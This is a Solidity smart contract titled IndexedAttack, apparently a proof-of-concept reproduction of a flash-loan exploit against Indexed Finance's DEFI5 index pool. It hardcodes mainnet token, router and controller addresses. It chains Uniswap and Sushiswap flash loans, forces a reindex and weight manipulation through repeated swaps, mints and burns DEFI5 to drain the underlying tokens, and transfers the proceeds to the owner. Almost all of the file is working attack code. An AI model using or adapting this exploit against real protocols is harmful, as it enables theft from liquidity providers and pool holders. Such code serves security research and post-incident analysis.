// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol";

import "contracts/indexed-finance/indexed-core/interfaces/IMarketCapSqrtController.sol";
import "contracts/indexed-finance/indexed-core/interfaces/IIndexPool.sol";
import "contracts/balancer/BNum.sol";

import "hardhat/console.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

contract IndexedAttack is Ownable, BNum, IUniswapV2Callee {
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address private constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address private constant COMP = 0xc00e94Cb662C3520282E6f5717214004A7f26888;
    address private constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address private constant MKR = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
    address private constant SNX = 0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F;
    address private constant SUSHI = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;
    address private constant UNISWAP_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address private constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    address private constant CONTROLLER = 0xF00A38376C8668fC1f3Cd3dAeef42E0E44A7Fcdb;
    address private constant DEFI5 = 0xfa6de2697D59E88Ed7Fc4dFE5A33daC43565ea41;

    uint256 count;
    bool attackBegan;
    address[] public borrowedTokens;
    uint256[] public borrowedAmounts;
    address[] public factories;
    address[] pairs;
    uint256[] public repayAmounts;
    uint256 private constant borrowedSushiAmount = 220000*10**18;

    function start(
        address[] memory _tokensBorrow,
        uint256[] memory _amounts,
        address[] memory _factories
    ) external onlyOwner {
        require(
            _tokensBorrow.length == _amounts.length && _factories.length == _amounts.length,
            "Invalid inputs"
        );
        count = 0;
        attackBegan = false;
        borrowedTokens = _tokensBorrow;
        borrowedAmounts = _amounts;
        factories = _factories;

        getLoan();
        moveFunds();
    }

    function getLoan() internal {
        address _tokenBorrow = borrowedTokens[count];
        uint256 _amount = borrowedAmounts[count];
        address factoryAddr = factories[count];

        address pair = IUniswapV2Factory(factoryAddr).getPair(
            _tokenBorrow,
            WETH
        );
        require(pair != address(0), "!pair");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        uint256 amount0Out = _tokenBorrow == token0 ? _amount : 0;
        uint256 amount1Out = _tokenBorrow == token1 ? _amount : 0;

        // need to pass some data to trigger uniswapV2Call
        bytes memory data = abi.encode(_tokenBorrow, _amount, factoryAddr);
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    function uniswapV2Call(
        address _sender,
        uint256 _amount0,
        uint256 _amount1,
        bytes calldata _data
    ) external override {
        require(_sender == address(this), "!sender");

        (address tokenBorrow, uint256 amount, address factoryAddr) = abi.decode(
            _data,
            (address, uint256, address)
        );
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        address pair = IUniswapV2Factory(factoryAddr).getPair(token0, token1);
        require(msg.sender == pair, "!pair");

        // about 0.3%
        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 repayAmount = amount + fee;

        if (!attackBegan) {
            pairs.push(pair);
            repayAmounts.push(repayAmount);
            count++;
            if (count == borrowedAmounts.length) {
                attackBegan = true;
                attack();
                repayLoans();
            } else {
                getLoan();
            }
        } else {
            continueAttack();
            repaySushiLoan(pair, repayAmount);
        }

    }

    function attack() internal {
        console.log("Performing attack");

        IMarketCapSqrtController controller = IMarketCapSqrtController(
            CONTROLLER
        );
        IIndexPool indexPool = IIndexPool(DEFI5);
        controller.reindexPool(DEFI5);

        IERC20(UNI).approve(DEFI5, uint256(-1));
        IERC20(AAVE).approve(DEFI5, uint256(-1));
        IERC20(COMP).approve(DEFI5, uint256(-1));
        IERC20(CRV).approve(DEFI5, uint256(-1));
        IERC20(MKR).approve(DEFI5, uint256(-1));
        IERC20(SNX).approve(DEFI5, uint256(-1));
        IERC20(SUSHI).approve(DEFI5, uint256(-1));

        // uint totalDenormWeight = indexPool.getTotalDenormalizedWeight();
        // console.log("Total denormalized weight: %s", totalDenormWeight / 10**18);

        (address tokenOut, uint value) = indexPool.extrapolatePoolValueFromToken();
        console.log("Extrapolated pool value from token: [%s, %s]", tokenOut, value / 10**18);

        uint tokenOutBalance = indexPool.getBalance(tokenOut);
        console.log("Initial Token balance: %s", tokenOutBalance / 10**18);

        for (uint i = 0; i < borrowedTokens.length; i++) {
            address tokenIn = borrowedTokens[i];
            if (tokenIn == tokenOut) {
                continue;
            }
            uint amountInRemain = borrowedAmounts[i];
            while (amountInRemain > 0) {
                uint amountIn = bmul(indexPool.getBalance(tokenIn), MAX_IN_RATIO);
                amountIn = amountInRemain < amountIn? amountInRemain : amountIn;
                amountInRemain -= amountIn;
                console.log("Swapping %s of [%s] for [%s]", amountIn/10**18, tokenIn, tokenOut);
                indexPool.swapExactAmountIn(tokenIn, amountIn, tokenOut, 0, uint256(-1));
            }
            console.log("tokenOut balance: %s", indexPool.getBalance(tokenOut) / 10**18);
        }

        controller.updateMinimumBalance(indexPool, SUSHI);

        uint amountOutRemain = IERC20(tokenOut).balanceOf(address(this));
        while (amountOutRemain > 0) {
            uint amountOut = bmul(indexPool.getBalance(tokenOut), MAX_IN_RATIO);
            amountOut = amountOutRemain < amountOut? amountOutRemain : amountOut;
            amountOutRemain -= amountOut;
            console.log("Minting DEFI5 tokens using %s [%s] tokens", amountOut/10**18, tokenOut);
            indexPool.joinswapExternAmountIn(tokenOut, amountOut, 0);
        }

        getSushiLoan();

    }

    function getSushiLoan() internal {
        console.log('Requesting sushi loan');
        address pair = IUniswapV2Factory(SUSHI_FACTORY).getPair(SUSHI, WETH);
        require(pair != address(0), "!pair");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        uint256 amount0Out = SUSHI == token0 ? borrowedSushiAmount : 0;
        uint256 amount1Out = SUSHI == token1 ? borrowedSushiAmount : 0;

        console.log('borrowing this much sushi', borrowedSushiAmount/ 10**18);
        bytes memory data = abi.encode(SUSHI, borrowedSushiAmount, SUSHI_FACTORY);
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    function continueAttack() internal {
        console.log('Continuing attacking');
        IERC20(SUSHI).transfer(DEFI5, borrowedSushiAmount);
        IIndexPool indexPool = IIndexPool(DEFI5);
        indexPool.gulp(SUSHI);

        uint[] memory minAmountOut = new uint[](7);
        for (uint i = 0; i < 7; i++) {
            minAmountOut[i] = 0;
        }
        uint defi5Balance = IERC20(DEFI5).balanceOf(address(this));
        console.log('Burning %s DEFI5 tokens', defi5Balance/10**18);
        indexPool.exitPool(defi5Balance, minAmountOut);
        printBalances();

        for (uint i = 0; i < 2; i++) {
            uint sushiRemain = IERC20(SUSHI).balanceOf(address(this));
            while (sushiRemain > 0) {
                uint amountIn = bmul(indexPool.getBalance(SUSHI), MAX_IN_RATIO);
                amountIn = sushiRemain < amountIn? sushiRemain : amountIn;
                sushiRemain -= amountIn;
                console.log("Minting DEFI5 tokens using %s [%s] tokens", amountIn/10**18, SUSHI);
                indexPool.joinswapExternAmountIn(SUSHI, amountIn, 0);
            }
            uint defi5Balance = IERC20(DEFI5).balanceOf(address(this));
            console.log('Burning %s DEFI5 tokens', defi5Balance/10**18);
            indexPool.exitPool(defi5Balance, minAmountOut);
            printBalances();
        }


    }

    function repaySushiLoan(address pair, uint repayAmount) internal {
        // swap some MKR to WETH to cover repayment
        address[] memory path = new address[](2);
        path[0] = MKR;
        path[1] = WETH;
        IERC20(MKR).approve(UNISWAP_ROUTER, uint(-1));
        IUniswapV2Router01(UNISWAP_ROUTER).swapTokensForExactTokens(115*10**18, uint(-1), path, address(this), uint(-1));
        IERC20(SUSHI).transfer(pair, IERC20(SUSHI).balanceOf(address(this)));
        IERC20(WETH).transfer(pair, 115*10**18); // estimated 115 based on trial and error
    }

    function repayLoans() internal {
        console.log("Repaying loans");
        for (uint256 i = 0; i < borrowedAmounts.length; i++) {
            address token = borrowedTokens[i];
            uint256 amount = borrowedAmounts[i];
            address pair = pairs[i];
            uint256 repayAmount = repayAmounts[i];

            IERC20(token).transfer(pair, repayAmount);
        }
    }

    function printBalances() internal {
        console.log("Contract balances are:");
        console.log("WETH %s", IERC20(WETH).balanceOf(address(this))/10**18);
        console.log("UNI %s", IERC20(UNI).balanceOf(address(this))/10**18);
        console.log("AAVE %s", IERC20(AAVE).balanceOf(address(this))/10**18);
        console.log("COMP %s", IERC20(COMP).balanceOf(address(this))/10**18);
        console.log("CRV %s", IERC20(CRV).balanceOf(address(this))/10**18);
        console.log("MKR %s", IERC20(MKR).balanceOf(address(this))/10**18);
        console.log("SNX %s", IERC20(SNX).balanceOf(address(this))/10**18);
        console.log("SUSHI %s", IERC20(SUSHI).balanceOf(address(this))/10**18);
    }

    function moveFunds() internal {
        console.log("Moving funds to owner");
        IERC20(WETH).transfer(owner(), IERC20(WETH).balanceOf(address(this)));
        IERC20(UNI).transfer(owner(), IERC20(UNI).balanceOf(address(this)));
        IERC20(AAVE).transfer(owner(), IERC20(AAVE).balanceOf(address(this)));
        IERC20(COMP).transfer(owner(), IERC20(COMP).balanceOf(address(this)));
        IERC20(CRV).transfer(owner(), IERC20(CRV).balanceOf(address(this)));
        IERC20(MKR).transfer(owner(), IERC20(MKR).balanceOf(address(this)));
        IERC20(SNX).transfer(owner(), IERC20(SNX).balanceOf(address(this)));
    }
}
